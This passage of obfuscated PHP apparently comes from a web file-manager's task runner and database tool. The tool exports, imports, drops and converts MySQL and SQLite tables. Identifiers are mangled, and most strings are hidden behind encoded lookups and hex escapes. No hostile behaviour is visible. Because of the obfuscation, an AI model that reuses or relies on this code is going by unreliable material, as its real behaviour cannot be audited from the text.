$©áÅ…‡ı->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($“¾œÍè©[1691], $“¾œÍè©[1692]); die; } } public static function taskRun($çöØöö) { $±ƒÍÎğÅ =& $_SERVER[ú‡®¯¨±]; self::log($±ƒÍÎğÅ[1693] . $çöØöö[$±ƒÍÎğÅ[453]] . $±ƒÍÎğÅ[1694] . $çöØöö[$±ƒÍÎğÅ[32]] . $±ƒÍÎğÅ[1695] . $çöØöö[$±ƒÍÎğÅ[1696]]); Model($±ƒÍÎğÅ[1677])->run($çöØöö[$±ƒÍÎğÅ[453]]); $Å›¶ĞâÃ = timeFloat(); $ØªÅ´³» = $±ƒÍÎğÅ[12]; switch ($çöØöö[$±ƒÍÎğÅ[33]]) { case $±ƒÍÎğÅ[362]: $ùÌî¾‹Á = url_request($çöØöö[$±ƒÍÎğÅ[1696]], $±ƒÍÎğÅ[257], !1, !1, !1, !1, 10); if ($ùÌî¾‹Á[$±ƒÍÎğÅ[805]]) { $ØªÅ´³» = strlen($ùÌî¾‹Á[$±ƒÍÎğÅ[1258]]); } break; case $±ƒÍÎğÅ[256]: $ØªÅ´³» = Hook::apply($çöØöö[$±ƒÍÎğÅ[1696]]); default: break; } Model($±ƒÍÎğÅ[1697])->add(array($±ƒÍÎğÅ[1698] => $±ƒÍÎğÅ[12], $±ƒÍÎğÅ[1699] => $±ƒÍÎğÅ[224], $±ƒÍÎğÅ[33] => $±ƒÍÎğÅ[1700] . $çöØöö[$±ƒÍÎğÅ[453]], $±ƒÍÎğÅ[1701] => json_encode(array($±ƒÍÎğÅ[32] => $çöØöö[$±ƒÍÎğÅ[32]], $±ƒÍÎğÅ[1702] => timeFloat() - $Å›¶ĞâÃ, $±ƒÍÎğÅ[348] => $ØªÅ´³»)))); $‰Ü²ºĞğ = $ØªÅ´³» ? $±ƒÍÎğÅ[1703] . $ØªÅ´³» : $±ƒÍÎğÅ[12]; self::log($±ƒÍÎğÅ[1704] . $çöØöö[$±ƒÍÎğÅ[453]] . $±ƒÍÎğÅ[167] . $‰Ü²ºĞğ); return !0; } public static function valueGet($“çí¥”®) { $ÓĞä¨ßÊ =& $_SERVER[ú‡®¯¨±]; $’ˆïœîâ = $ÓĞä¨ßÊ[1705]; $­°ıµ–î = Model($ÓĞä¨ßÊ[486])->get($“çí¥”®, $’ˆïœîâ); if (is_null($­°ıµ–î)) { Model($ÓĞä¨ßÊ[486])->set($ÓĞä¨ßÊ[805], $ÓĞä¨ßÊ[90], $’ˆïœîâ); Model($ÓĞä¨ßÊ[486])->set($ÓĞä¨ßÊ[1658], $ÓĞä¨ßÊ[224], $’ˆïœîâ); $­°ıµ–î = Model($ÓĞä¨ßÊ[486])->get($“çí¥”®, $’ˆïœîâ); } return $­°ıµ–î; } private static function valueSet($›ê°Ñ¼, $à€—¢ø = false) { $ÄÃ‰–ú¥ =& $_SERVER[ú‡®¯¨±]; $±‡»ë˜Ô = $ÄÃ‰–ú¥[1706]; CacheLock::lock($±‡»ë˜Ô); $‚Üİ±‹° = Model($ÄÃ‰–ú¥[486])->set($›ê°Ñ¼, $à€—¢ø, $ÄÃ‰–ú¥[1705]); CacheLock::unlock($±‡»ë˜Ô); return $‚Üİ±‹°; } protected static function log($×şÅÏ«) { write_log($×şÅÏ«, $_SERVER[ú‡®¯¨±][1692]); } private static function cacheClear() { $ÏÀ””¦Ø =& $_SERVER[ú‡®¯¨±]; Cache::clearMemory(Model($ÏÀ””¦Ø[486])->cacheKey($ÏÀ””¦Ø[1705])); Cache::clearMemory(Model($ÏÀ””¦Ø[486])->cacheKey($ÏÀ””¦Ø[1707])); Model($ÏÀ””¦Ø[1677])->cacheClear(); self::closeDatabase(); } } goto BÕÌÚñÏ²¾; bÅèŞ ğ¼: class DbManage { function __construct($åşÒ°‹õ = array()) { $µ‹ÎéÜá =& $_SERVER[ú‡®¯¨±]; if (empty($åşÒ°‹õ)) { $åşÒ°‹õ = $GLOBALS[$µ‹ÎéÜá[6]][$µ‹ÎéÜá[21]]; } $this->database = $åşÒ°‹õ; } public function model($Ò•½…Ù = '') { return new ModelBase($Ò•½…Ù, $_SERVER[ú‡®¯¨±][12], $this->database); } public function db($¬¯¼Œıû = false) { $Œ½¸ Øû =& $_SERVER[ú‡®¯¨±]; $‡ÉÀšÃà = array_change_key_case($this->database); if ($this->dbType() == $Œ½¸ Øû[13] || !$¬¯¼Œıû) { return $this->model()->db(); } $š»È¿æ = $‡ÉÀšÃà[$Œ½¸ Øû[1028]]; $‡ÉÀšÃà[$Œ½¸ Øû[1028]] = $Œ½¸ Øû[12]; if ($‡ÉÀšÃà[$Œ½¸ Øû[1023]] == $Œ½¸ Øû[1020]) { $àòÄ–Ì§ = $‡ÉÀšÃà[$Œ½¸ Øû[1029]]; $‡ÉÀšÃà[$Œ½¸ Øû[1029]] = substr($àòÄ–Ì§, 0, strrpos($àòÄ–Ì§, $Œ½¸ Øû[1115])); } $this->database = $‡ÉÀšÃà; $°‘Á·¸° = $this->model()->db(); try { $¼‰»şƒÂ = $°‘Á·¸°->execute("\163\150\157\x77\40\144\141\164\141\x62\x61\x73\x65\163\40\154\151\x6b\x65\40\x27{$š»È¿æ}\x27"); } catch (Exception $¨¼œ…·) { } if (!$¼‰»şƒÂ) { $°‘Á·¸°->execute("\x63\x72\x65\x61\x74\x65\x20\x64\141\x74\x61\x62\141\163\x65\x20\140{$š»È¿æ}\140"); } $‡ÉÀšÃà[$Œ½¸ Øû[1028]] = $š»È¿æ; if ($‡ÉÀšÃà[$Œ½¸ Øû[1023]] == $Œ½¸ Øû[1020]) { $‡ÉÀšÃà[$Œ½¸ Øû[1029]] .= $Œ½¸ Øû[1115] . $š»È¿æ; } $this->database = $‡ÉÀšÃà; $°‘Á·¸°->execute("\x75\x73\x65\40\140{$š»È¿æ}\x60"); return $°‘Á·¸°; } public function createTable($Ö¼Ò¬·¶, &$­ëÌƒ†õ) { $Ï§« é =& $_SERVER[ú‡®¯¨±]; if (!IO::exist($Ö¼Ò¬·¶)) { ActionCall($Ï§« é[1116], !0, 0); show_json(LNG($Ï§« é[1117]), !1); } $ñâÀ İñ = $this->model()->db(); $·¾øŸ÷ = sqlSplit(IO::getContent($Ö¼Ò¬·¶)); foreach ($·¾øŸ÷ as $ùÒ¥ñÏ) { $ÑØÙš®İ = stripos($ùÒ¥ñÏ, $Ï§« é[1118]) === 0; if ($ÑØÙš®İ) { $­ëÌƒ†õ->task[$Ï§« é[841]] += 1; } $ñâÀ İñ->execute($ùÒ¥ñÏ); if ($ÑØÙš®İ) { preg_match($Ï§« é[1119], $ùÒ¥ñÏ, $ú‚ò›â»); $­ëÌƒ†õ->task[$Ï§« é[1120]] = $ú‚ò›â»[1]; $­ëÌƒ†õ->update(1); } } } public function insertTable($òÓïª¯ë, &$”ó‡óè„) { $ïÕ­Œùğ =& $_SERVER[ú‡®¯¨±]; $ê¨ÜÛöµ = $this->model()->db(); $ûœ–ç¢§ = $Ç¢ˆ×× ? array($Ç¢ˆ××) : $ê¨ÜÛöµ->getTables(); foreach ($òÓïª¯ë as $©¸Ù÷è¬) { $Ç¢ˆ×× = basename($©¸Ù÷è¬, $ïÕ­Œùğ[843]); if (!in_array($Ç¢ˆ××, $ûœ–ç¢§)) { continue; } $”ó‡óè„->task[$ïÕ­Œùğ[1120]] = $Ç¢ˆ××; if (get_filesize($©¸Ù÷è¬) == 0) { continue; } $Ùæˆá = $this->sqlToDb($©¸Ù÷è¬, $”ó‡óè„); if (!$Ùæˆá) { ActionCall($ïÕ­Œùğ[1116], !0, 0); show_json(LNG($ïÕ­Œùğ[1121]) . "\x5b{$Ç¢ˆ××}\135", !1); } } } public function sqlFromDb($Äİâ‹È•, $âßƒÆôÒ, &$ŒÂèúÒğ, $÷‹è‡ç´ = '') { if ($ŒÂèúÒğ) { $ŒÂèúÒğ->task[$_SERVER[ú‡®¯¨±][1120]] = $Äİâ‹È•; } $æ—ÏÈŒ” = $this->model($Äİâ‹È•); $ ¦£Œô„ = 0; $ë¡ã¬¢Ş = 0; $ÆÑ—Àê… = 10000; $§øƒ¼ğù = fopen($âßƒÆôÒ, $_SERVER[ú‡®¯¨±][1122]); $¬˜×œ™ï = $æ—ÏÈŒ”->getPk(); $”ÕÊÃ°ı = $æ—ÏÈŒ”->getDbFields(); $¢”¡¸Ãö = $_SERVER[ú‡®¯¨±][12]; if ($GLOBALS[$_SERVER[ú‡®¯¨±][842]] && in_array($Äİâ‹È•, array($_SERVER[ú‡®¯¨±][1123], $_SERVER[ú‡®¯¨±][1124]))) { $¢”¡¸Ãö = $Äİâ‹È•; } do { $€ÆÄ×ö = array($¬˜×œ™ï => array($_SERVER[ú‡®¯¨±][1070], $ë¡ã¬¢Ş)); $ğ™îäÏØ = $æ—ÏÈŒ”->where($€ÆÄ×ö)->field($”ÕÊÃ°ı)->order($¬˜×œ™ï . $_SERVER[ú‡®¯¨±][1125])->limit($ÆÑ—Àê…)->select(); $ğ™îäÏØ = !empty($ğ™îäÏØ) ? $ğ™îäÏØ : array(); if (!($ óÃ£âö = count($ğ™îäÏØ))) { break; } $è•¬àóá = end($ğ™îäÏØ); $ë¡ã¬¢Ş = $è•¬àóá[$¬˜×œ™ï]; $íŠÚ‰Â… = array(); foreach ($ğ™îäÏØ as $¦ñÆŞî) { if ($¢”¡¸Ãö) { if ($Äİâ‹È• == $_SERVER[ú‡®¯¨±][1123]) { if ($¦ñÆŞî[$_SERVER[ú‡®¯¨±][33]] == $_SERVER[ú‡®¯¨±][1126]) { $‡š–ã¹¹ = json_decode($¦ñÆŞî[$_SERVER[ú‡®¯¨±][429]], !0); if ($‡š–ã¹¹[$_SERVER[ú‡®¯¨±][32]] == $GLOBALS[$_SERVER[ú‡®¯¨±][842]] && $‡š–ã¹¹[$_SERVER[ú‡®¯¨±][805]] != 1) { continue; } } } else { if ($¦ñÆŞî[$_SERVER[ú‡®¯¨±][33]] == $_SERVER[ú‡®¯¨±][1127] && $¦ñÆŞî[$_SERVER[ú‡®¯¨±][96]] == $_SERVER[ú‡®¯¨±][834]) { continue; } } } if ($÷‹è‡ç´) { $¦ñÆŞî[$_SERVER[ú‡®¯¨±][86]] = "\173\151\x6f\x3a{$÷‹è‡ç´}\x7d" . substr($¦ñÆŞî[$_SERVER[ú‡®¯¨±][86]], strlen("\x7b\x69\157\x3a{$¦ñÆŞî[$_SERVER[ú‡®¯¨±][872]]}\175")); $¦ñÆŞî[$_SERVER[ú‡®¯¨±][872]] = $÷‹è‡ç´; } $íŠÚ‰Â…[] = $_SERVER[ú‡®¯¨±][1128] . $this->sqlEncode($¦ñÆŞî) . $_SERVER[ú‡®¯¨±][1129]; } $¼”²È¦ô = "\111\116\123\105\122\x54\x20\111\x4e\124\117\40\140{$Äİâ‹È•}\x60\x20\50\140" . implode($_SERVER[ú‡®¯¨±][1130], $”ÕÊÃ°ı) . $_SERVER[ú‡®¯¨±][1131]; fwrite($§øƒ¼ğù, $¼”²È¦ô . implode($_SERVER[ú‡®¯¨±][1132], $íŠÚ‰Â…) . $_SERVER[ú‡®¯¨±][73] . PHP_EOL); $ ¦£Œô„ += $ óÃ£âö; if ($ŒÂèúÒğ) { $ŒÂèúÒğ->update($ óÃ£âö); } } while ($ÆÑ—Àê… == $ óÃ£âö); fclose($§øƒ¼ğù); return $ ¦£Œô„; } public function sqlToDb($°À°ª, &$İ£©ÀëÂ) { $ôîôóĞŒ =& $_SERVER[ú‡®¯¨±]; $´õõá”‰ = $this->model()->db(); $å§î÷¹Î = @fopen($°À°ª, $ôîôóĞŒ[1133]); if (!$å§î÷¹Î) { return !1; } $¼åØÚ†Ô = 0; $é ºÔ = $ôîôóĞŒ[12]; $³À†Ÿ×˜ = array(); $„Í÷•šê = $this->dbType(); $íèÒ…Í„ = $„Í÷•šê == $ôîôóĞŒ[13] ? 500 : 2000; $„¸¥ÃŞí = basename($°À°ª, $ôîôóĞŒ[843]); $Éù±ÚÔ = 0; $‡—ª•† = 4194304 - 104858; $›Œ˜ßÂ³ = 1000000 - 104858; while (!feof($å§î÷¹Î)) { $ÛÏºÆ»¡ = trim(fgets($å§î÷¹Î)); if (!$ÛÏºÆ»¡) { continue; } $¾âô¢ë = $this->sqlDecode($ÛÏºÆ»¡, $„Í÷•šê, $„¸¥ÃŞí); if (stripos($¾âô¢ë, $ôîôóĞŒ[410]) === 0) { if (!$é ºÔ) { $é ºÔ = $¾âô¢ë . $ôîôóĞŒ[53]; } continue; } if ($İ£©ÀëÂ) { $İ£©ÀëÂ->task[$ôîôóĞŒ[841]] += 1; } $¼åØÚ†Ô++; $³À†Ÿ×˜[] = rtrim(rtrim(trim($¾âô¢ë), $ôîôóĞŒ[50]), $ôîôóĞŒ[73]); $Ëø¼°ıÆ = null; $€üš÷Ÿ = strlen($¾âô¢ë); $Éù±ÚÔ += $€üš÷Ÿ; if ($Éù±ÚÔ >= ($íèÒ…Í„ == 500 ? $›Œ˜ßÂ³ : $‡—ª•†)) { $Ëø¼°ıÆ = array_pop($³À†Ÿ×˜); if ($¼åØÚ†Ô > 1) { $¼åØÚ†Ô--; } } if ($¼åØÚ†Ô >= $íèÒ…Í„ || $Ëø¼°ıÆ) { $¾âô¢ë = $é ºÔ . implode($ôîôóĞŒ[50], $³À†Ÿ×˜); if (!$´õõá”‰->execute($¾âô¢ë)) { return !1; } if ($İ£©ÀëÂ) { $İ£©ÀëÂ->update($¼åØÚ†Ô); } $³À†Ÿ×˜ = array(); $¼åØÚ†Ô = 0; $Éù±ÚÔ = 0; if ($Ëø¼°ıÆ) { $³À†Ÿ×˜ = array($Ëø¼°ıÆ); $¼åØÚ†Ô = 1; $Éù±ÚÔ = $€üš÷Ÿ; } } } fclose($å§î÷¹Î); if (!empty($³À†Ÿ×˜)) { $¾âô¢ë = $é ºÔ . implode($ôîôóĞŒ[50], $³À†Ÿ×˜); if (!$´õõá”‰->execute($¾âô¢ë)) { return !1; } if ($İ£©ÀëÂ) { $İ£©ÀëÂ->update($¼åØÚ†Ô); } } return !0; } public function dropTable($—Âç•‡± = null) { $©’ø¼À© = $this->model()->db(); $´–âÂÕ = $—Âç•‡± ? array($—Âç•‡±) : $©’ø¼À©->getTables(); if (!$´–âÂÕ) { return; } foreach ($´–âÂÕ as $—Âç•‡±) { if ($—Âç•‡±) { $—Âç•‡± = strtolower($—Âç•‡±); } else { continue; } $©’ø¼À©->execute("\x64\162\157\160\x20\x74\141\x62\x6c\x65\40\x69\x66\x20\145\x78\x69\x73\x74\163\40\x60{$—Âç•‡±}\140"); } } private function sqlEncode($´Ø­äô€) { $¶ÔªœÂÈ =& $_SERVER[ú‡®¯¨±]; $ÛÍó»€¼ = array(); foreach ($´Ø­äô€ as $Ğ€ñÇ¬È) { if (is_array($Ğ€ñÇ¬È)) { $Ğ€ñÇ¬È = json_encode_force($Ğ€ñÇ¬È); } $Ğ€ñÇ¬È = addslashes($Ğ€ñÇ¬È); $Ğ€ñÇ¬È = str_replace(array($¶ÔªœÂÈ[1134], $¶ÔªœÂÈ[207]), array($¶ÔªœÂÈ[1135], $¶ÔªœÂÈ[1136]), $Ğ€ñÇ¬È); $ÛÍó»€¼[] = str_replace($¶ÔªœÂÈ[58], $¶ÔªœÂÈ[1137], $Ğ€ñÇ¬È); } return $¶ÔªœÂÈ[58] . implode($¶ÔªœÂÈ[1138], $ÛÍó»€¼) . $¶ÔªœÂÈ[58]; } private function sqlDecode($£èÚ¬Â’, $¡ÇÚàÈ, $¸›——ü™ = '') { $ÑöæïÇ =& $_SERVER[ú‡®¯¨±]; $£èÚ¬Â’ = str_replace(array($ÑöæïÇ[1135], $ÑöæïÇ[1136]), array($ÑöæïÇ[1134], $ÑöæïÇ[207]), $£èÚ¬Â’); if ($¡ÇÚàÈ == $ÑöæïÇ[13]) { return $¸›——ü™ != $ÑöæïÇ[1139] ? stripslashes($£èÚ¬Â’) : $£èÚ¬Â’; } if ($¸›——ü™ == $ÑöæïÇ[1139]) { $£èÚ¬Â’ = str_replace($ÑöæïÇ[1140], $ÑöæïÇ[120], stripslashes($£èÚ¬Â’)); } return $£èÚ¬Â’; } public function getSqlFile($ª‹¬î¦ˆ = '') { $–ãëâÆ =& $_SERVER[ú‡®¯¨±]; $ê§ƒ³øû = $this->dbType(!0); $üÛâìá‰ = CONTROLLER_DIR . "\151\x6e\163\164\x61\154\154\57\x64\x61\x74\141\57{$ê§ƒ³øû}\56\163\161\154"; $Ò¤Šş¹ = file_get_contents($üÛâìá‰); $Œ©· = $–ãëâÆ[1141] . ($ê§ƒ³øû == $–ãëâÆ[859] ? $–ãëâÆ[1142] : $–ãëâÆ[1143]) . $–ãëâÆ[1144]; preg_match_all($Œ©·, $Ò¤Šş¹, $¬—×­); $É‚é”ƒ¨ = $¬—×­[1]; $°ì€úûò = $this->model()->db(); $¿øÄ­áì = $°ì€úûò->getTables(); $Îã ©€ = TEMP_FILES . $–ãëâÆ[1145] . date($–ãëâÆ[266]) . $–ãëâÆ[8]; del_dir($Îã ©€); mk_dir($Îã ©€); $„ÄŠ„µ = $Îã ©€ . $–ãëâÆ[1146]; $İˆä™´¾ = $Îã ©€ . $–ãëâÆ[1147]; $—¦üîí = $ê§ƒ³øû == $–ãëâÆ[13] ? $–ãëâÆ[859] : $–ãëâÆ[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\x73\x74\x61\x6c\154\57\x64\x61\164\141\x2f{$—¦üîí}\56\x73\161\x6c", $Îã ©€); @touch($Îã ©€ . $ê§ƒ³øû . $–ãëâÆ[843]); $Ùå´Òóõ = fopen($„ÄŠ„µ, $–ãëâÆ[1122]); $¿°ˆÇşı = fopen($İˆä™´¾, $–ãëâÆ[1122]); if ($ê§ƒ³øû == $–ãëâÆ[13]) { $¿øÄ­áì = array_diff($¿øÄ­áì, array($–ãëâÆ[839], $–ãëâÆ[840])); $‡Æ¹Ç = array($–ãëâÆ[1148], $–ãëâÆ[1149], $–ãëâÆ[1150]); fwrite($¿°ˆÇşı, implode(PHP_EOL, $‡Æ¹Ç) . PHP_EOL . PHP_EOL); foreach ($¿øÄ­áì as $³†²òÙ) { $€»„¡¿ß = $this->sqlFromSqlite($³†²òÙ); if (!$€»„¡¿ß[$–ãëâÆ[13]]) { continue; } fwrite($¿°ˆÇşı, $€»„¡¿ß[$–ãëâÆ[13]] . PHP_EOL . PHP_EOL); if (!in_array($³†²òÙ, $É‚é”ƒ¨)) { fwrite($Ùå´Òóõ, $€»„¡¿ß[$–ãëâÆ[859]] . PHP_EOL . PHP_EOL); } } } else { foreach ($¿øÄ­áì as $³†²òÙ) { $€»„¡¿ß = $this->sqlFromMysql($³†²òÙ); if (!$€»„¡¿ß[$–ãëâÆ[859]]) { continue; } fwrite($Ùå´Òóõ, $€»„¡¿ß[$–ãëâÆ[859]] . PHP_EOL . PHP_EOL); if (!in_array($³†²òÙ, $É‚é”ƒ¨)) { fwrite($¿°ˆÇşı, $€»„¡¿ß[$–ãëâÆ[13]] . PHP_EOL . PHP_EOL); } } } fclose($Ùå´Òóõ); fclose($¿°ˆÇşı); $Ò¤Šş¹ = array($–ãëâÆ[859] => $„ÄŠ„µ, $–ãëâÆ[13] => $İˆä™´¾); return $ª‹¬î¦ˆ ? $Ò¤Šş¹[$ª‹¬î¦ˆ] : $Ò¤Šş¹; } public function dbType($œÁø”Ò’ = false) { $Ï¯Ñá³ô =& $_SERVER[ú‡®¯¨±]; $¤ŞŸ·İÇ = $œÁø”Ò’ ? $GLOBALS[$Ï¯Ñá³ô[6]][$Ï¯Ñá³ô[21]] : $this->database; $¤ŞŸ·İÇ = array_change_key_case($¤ŞŸ·İÇ); $¼ ê±“Å = $¤ŞŸ·İÇ[$Ï¯Ñá³ô[1023]]; if ($¼ ê±“Å == $Ï¯Ñá³ô[1020]) { $¾Ë±‰Şô = explode($Ï¯Ñá³ô[4], $¤ŞŸ·İÇ[$Ï¯Ñá³ô[1029]]); $¼ ê±“Å = $¾Ë±‰Şô[0]; } $ƒ×´ò×¼ = array($Ï¯Ñá³ô[1151] => $Ï¯Ñá³ô[13], $Ï¯Ñá³ô[968] => $Ï¯Ñá³ô[859]); if (isset($ƒ×´ò×¼[$¼ ê±“Å])) { $¼ ê±“Å = $ƒ×´ò×¼[$¼ ê±“Å]; } return $¼ ê±“Å; } public function sqlFromMysql($˜õÂÜöÙ, $½½Îìò¬ = '') { $ÏÀûâò€ =& $_SERVER[ú‡®¯¨±]; $™Û‚§Ğó = $this->model()->db(); $¹×›Õ€ = $™Û‚§Ğó->query($ÏÀûâò€[1152] . $˜õÂÜöÙ . $ÏÀûâò€[439]); if (!$¹×›Õ€ || !$¹×›Õ€[0]) { return !1; } $ªÜÎ—÷¼ = _get($¹×›Õ€[0], $ÏÀûâò€[1153], $ÏÀûâò€[12]); if (!$ªÜÎ—÷¼) { return !1; } $²Ï’‡£ = "\104\x52\x4f\x50\x20\124\x41\102\x4c\105\x20\x49\x46\40\105\130\x49\123\124\123\x20\x60{$˜õÂÜöÙ}\x60\x3b" . PHP_EOL . $ªÜÎ—÷¼ . $ÏÀûâò€[73]; if ($½½Îìò¬ && $½½Îìò¬ == $ÏÀûâò€[859]) { return $²Ï’‡£; } $§µ§•øã = array_change_key_case($GLOBALS[$ÏÀûâò€[6]][$ÏÀûâò€[21]]); $êªÅ‡Õ× = $§µ§•øã[$ÏÀûâò€[1028]]; $±Ş˜„È = $ÏÀûâò€[1154] . $êªÅ‡Õ× . $ÏÀûâò€[1155] . $˜õÂÜöÙ . $ÏÀûâò€[58]; $ÀúŒì±¬ = $ÏÀûâò€[1156] . $˜õÂÜöÙ . $ÏÀûâò€[956]; $Û€º©É¢ = $™Û‚§Ğó->query($±Ş˜„È); if (empty($Û€º©É¢)) { $¹Ç³Õ« = array($ÏÀûâò€[859] => $ÏÀûâò€[12], $ÏÀûâò€[13] => $ÏÀûâò€[12]); return $½½Îìò¬ ? $¹Ç³Õ«[$½½Îìò¬] : $¹Ç³Õ«; } $×†¼¬Õ = $™Û‚§Ğó->query($ÀúŒì±¬); $ö÷‡×ïÅ = $ÏÀûâò€[12]; $§Ä‘¥¦ì = array(); foreach ($×†¼¬Õ as $óˆÈòâ¾) { if (!$ö÷‡×ïÅ && $óˆÈòâ¾[$ÏÀûâò€[1157]] == $ÏÀûâò€[1158]) { $ö÷‡×ïÅ = $óˆÈòâ¾[$ÏÀûâò€[1159]]; } if (isset($§Ä‘¥¦ì[$óˆÈòâ¾[$ÏÀûâò€[1157]]])) { $§Ä‘¥¦ì[$óˆÈòâ¾[$ÏÀûâò€[1157]]][$ÏÀûâò€[1160]][] = $óˆÈòâ¾[$ÏÀûâò€[1159]]; continue; } $§Ä‘¥¦ì[$óˆÈòâ¾[$ÏÀûâò€[1157]]] = array($ÏÀûâò€[1161] => $óˆÈòâ¾[$ÏÀûâò€[1157]], $ÏÀûâò€[1160] => array($óˆÈòâ¾[$ÏÀûâò€[1159]]), $ÏÀûâò€[1162] => $óˆÈòâ¾[$ÏÀûâò€[1163]] == $ÏÀûâò€[90] ? 0 : 1); } $°ù‡Ï® = array(); foreach ($§Ä‘¥¦ì as $óˆÈòâ¾) { $©²äµç = $óˆÈòâ¾[$ÏÀûâò€[1161]] == $ÏÀûâò€[1158]; $«„‘Ø¡Ã = array($ÏÀûâò€[1164], $óˆÈòâ¾[$ÏÀûâò€[1162]] == $ÏÀûâò€[90] && !$©²äµç ? $ÏÀûâò€[1165] : $ÏÀûâò€[12], $ÏÀûâò€[1166], $ÏÀûâò€[1167] . $˜õÂÜöÙ . $ÏÀûâò€[11] . ($©²äµç ? $ÏÀûâò€[1168] : $óˆÈòâ¾[$ÏÀûâò€[1161]]) . $ÏÀûâò€[120], $ÏÀûâò€[1169], $ÏÀûâò€[120] . $˜õÂÜöÙ . $ÏÀûâò€[120], $ÏÀûâò€[1170] . implode($ÏÀûâò€[1171], $óˆÈòâ¾[$ÏÀûâò€[1160]]) . $ÏÀûâò€[1172]); $°ù‡Ï®[] = implode($ÏÀûâò€[53], $«„‘Ø¡Ã) . $ÏÀûâò€[73]; } $‡¹¢ş¶ = array(); $Û·ØóÏ = array($ÏÀûâò€[1173] => $ÏÀûâò€[1174], $ÏÀûâò€[1174] => $ÏÀûâò€[1174], $ÏÀûâò€[343] => $ÏÀûâò€[370], $ÏÀûâò€[342] => $ÏÀûâò€[370]); foreach ($Û€º©É¢ as $óˆÈòâ¾) { $«„‘Ø¡Ã = array($ÏÀûâò€[120] . $óˆÈòâ¾[$ÏÀûâò€[1175]] . $ÏÀûâò€[120], isset($Û·ØóÏ[$óˆÈòâ¾[$ÏÀûâò€[1176]]]) ? $Û·ØóÏ[$óˆÈòâ¾[$ÏÀûâò€[1176]]] : $óˆÈòâ¾[$ÏÀûâò€[1177]], $óˆÈòâ¾[$ÏÀûâò€[1178]] == $ÏÀûâò€[954] ? $ÏÀûâò€[1179] : $ÏÀûâò€[1180], $óˆÈòâ¾[$ÏÀûâò€[1175]] == $ö÷‡×ïÅ ? $ÏÀûâò€[1181] : $ÏÀûâò€[12], $óˆÈòâ¾[$ÏÀûâò€[1005]] ? strtoupper(str_replace($ÏÀûâò€[11], $ÏÀûâò€[12], $óˆÈòâ¾[$ÏÀûâò€[1005]])) : $ÏÀûâò€[12]); $‡¹¢ş¶[] = trim(implode($ÏÀûâò€[53], $«„‘Ø¡Ã)); } $ƒÄïÒ€Á = array($ÏÀûâò€[1182] . $˜õÂÜöÙ . $ÏÀûâò€[1183], $ÏÀûâò€[1184] . $˜õÂÜöÙ . $ÏÀûâò€[1185], implode($ÏÀûâò€[50] . PHP_EOL, $‡¹¢ş¶), $ÏÀûâò€[1002]); $è¨ä¬åö = implode(PHP_EOL, array_merge($ƒÄïÒ€Á, $°ù‡Ï®)); if ($½½Îìò¬ && $½½Îìò¬ == $ÏÀûâò€[13]) { return $è¨ä¬åö; } $¹Ç³Õ« = array($ÏÀûâò€[859] => $²Ï’‡£, $ÏÀûâò€[13] => $è¨ä¬åö); return $½½Îìò¬ ? $¹Ç³Õ«[$½½Îìò¬] : $¹Ç³Õ«; } public function sqlFromSqlite($Ë€à½›¯, $Æ‹Îşùš = '') { $‹˜ï–ñÇ =& $_SERVER[ú‡®¯¨±]; $º€›¼¾« = $this->model()->db(); $‹Áü§ÀŒ = "\120\x52\x41\107\x4d\101\x20\124\x41\x42\114\x45\x5f\x49\x4e\106\117\40\x28\x27{$Ë€à½›¯}\47\x29"; $‹ÖÉóêÔ = "\x53\105\x4c\x45\103\x54\40\52\x20\x46\x52\117\x4d\x20\x73\161\154\x69\164\x65\x5f\155\141\x73\x74\145\162\40\x57\110\105\122\105\x20\x74\x62\x6c\x5f\x6e\141\x6d\x65\x20\x3d\x20\x27{$Ë€à½›¯}\x27"; $Ú±Ä™‚î = $º€›¼¾«->query($‹Áü§ÀŒ); if (empty($Ú±Ä™‚î)) { $ì®®ì¨ = array($‹˜ï–ñÇ[859] => $‹˜ï–ñÇ[12], $‹˜ï–ñÇ[13] => $‹˜ï–ñÇ[12]); return $Æ‹Îşùš ? $ì®®ì¨[$Æ‹Îşùš] : $ì®®ì¨; } $øûßæ¿ö = $º€›¼¾«->query($‹ÖÉóêÔ); $£æ¦±Äß = $Æ‰å§Ê¬ = array(); foreach ($øûßæ¿ö as $ü»ºéÃ) { if ($ü»ºéÃ[$‹˜ï–ñÇ[33]] == $‹˜ï–ñÇ[334]) { $£æ¦±Äß[] = $ü»ºéÃ[$‹˜ï–ñÇ[1186]]; } else { $Æ‰å§Ê¬[$ü»ºéÃ[$‹˜ï–ñÇ[32]]] = $ü»ºéÃ[$‹˜ï–ñÇ[1186]]; } } $†»ÚŸ©û = array_merge(array($‹˜ï–ñÇ[1182] . $Ë€à½›¯ . $‹˜ï–ñÇ[120]), $£æ¦±Äß, array_values($Æ‰å§Ê¬)); $†»ÚŸ©û = implode($‹˜ï–ñÇ[73] . PHP_EOL, $†»ÚŸ©û) . $‹˜ï–ñÇ[73]; if ($Æ‹Îşùš && $Æ‹Îşùš == $‹˜ï–ñÇ[13]) { return $†»ÚŸ©û; } $°šèÅ®ï = array(); $ì„·ŒÀÎ = array($‹˜ï–ñÇ[1174] => $‹˜ï–ñÇ[1187], $‹˜ï–ñÇ[370] => $‹˜ï–ñÇ[1188]); $ª‘€×Ù§ = $‹˜ï–ñÇ[12]; foreach ($Ú±Ä™‚î as $ü»ºéÃ) { if ($ü»ºéÃ[$‹˜ï–ñÇ[57]] == $‹˜ï–ñÇ[90]) { $ª‘€×Ù§ = $ü»ºéÃ[$‹˜ï–ñÇ[32]]; } $ş“àŞŠ = array($‹˜ï–ñÇ[439] . $ü»ºéÃ[$‹˜ï–ñÇ[32]] . $‹˜ï–ñÇ[439], isset($ì„·ŒÀÎ[$ü»ºéÃ[$‹˜ï–ñÇ[33]]]) ? $ì„·ŒÀÎ[$ü»ºéÃ[$‹˜ï–ñÇ[33]]] : $ü»ºéÃ[$‹˜ï–ñÇ[33]], $ü»ºéÃ[$‹˜ï–ñÇ[35]] == $‹˜ï–ñÇ[90] ? $‹˜ï–ñÇ[1179] : $‹˜ï–ñÇ[1189] . $ü»ºéÃ[$‹˜ï–ñÇ[56]], $ü»ºéÃ[$‹˜ï–ñÇ[57]] == $‹˜ï–ñÇ[90] ? $‹˜ï–ñÇ[1190] : $‹˜ï–ñÇ[12]); $°šèÅ®ï[] = trim(implode($‹˜ï–ñÇ[53], $ş“àŞŠ)); } foreach ($Æ‰å§Ê¬ as $§Ö€²ğø => $¤Ãæ‘‘) { $°£¿€× = str_replace($‹˜ï–ñÇ[1191] . $Ë€à½›¯ . $‹˜ï–ñÇ[11], $‹˜ï–ñÇ[12], $§Ö€²ğø); $æ©«÷ö• = 